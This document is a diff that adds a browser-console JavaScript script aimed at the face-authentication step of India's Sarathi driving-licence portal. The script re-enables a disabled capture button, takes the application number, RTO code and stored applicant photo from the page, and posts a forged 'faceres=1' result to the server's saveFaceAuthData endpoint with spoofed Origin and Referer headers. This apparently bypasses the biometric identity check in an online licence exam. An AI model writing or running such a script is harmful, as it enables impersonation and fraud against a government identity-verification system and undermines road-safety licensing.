@@ -1,0 +1,72 @@
+(async function () {
+
+console.log("🚀 Starting FaceAuth console script...");
+
+// Enable capphto1 button
+const enableInterval = setInterval(() => {
+    const btn = document.getElementById("capphto1");
+    if (btn) {
+        btn.disabled = false;
+        btn.removeAttribute("disabled");
+        btn.style.pointerEvents = "auto";
+        btn.style.opacity = "1";
+        clearInterval(enableInterval);
+        console.log("✅ capphto1 button enabled");
+    }
+}, 300);
+
+
+// Wait a moment for page variables
+await new Promise(r => setTimeout(r, 1000));
+
+const applno = document.getElementById('llappln')?.value || '';
+const rtocode = document.getElementById('rtocode')?.value || '';
+const capPho = window.applimg;
+
+if (!applno || !rtocode || !capPho) {
+    console.error("❌ Missing required data", { applno, rtocode, capPho });
+    alert("Required data missing. Make sure page fully loaded.");
+    return;
+}
+
+try {
+
+    if (typeof faceAuthStatus === "function") {
+        try {
+            await faceAuthStatus();
+            console.log("faceAuthStatus executed");
+        } catch (e) {
+            console.warn("faceAuthStatus error:", e);
+        }
+    }
+
+    const data = new URLSearchParams();
+    data.append("applno", applno);
+    data.append("rtocode", rtocode);
+    data.append("faceres", "1");
+    data.append("CapPho", capPho);
+
+    const response = await fetch("/sarathiservice/saveFaceAuthData.do", {
+        method: "POST",
+        credentials: "same-origin",
+        headers: {
+            "Accept-Language": "en-US,en;q=0.9",
+            "X-Requested-With": "XMLHttpRequest",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://sarathi.parivahan.gov.in",
+            "Referer": "https://sarathi.parivahan.gov.in/sarathiservice/stallexamaction.do"
+        },
+        body: data.toString()
+    });
+
+    const json = await response.json();
+    console.log("✅ Server Response:", json);
+
+    alert("✅ FaceAuth request sent successfully!");
+
+} catch (err) {
+    console.error("❌ FaceAuth error:", err);
+}
+
+})();
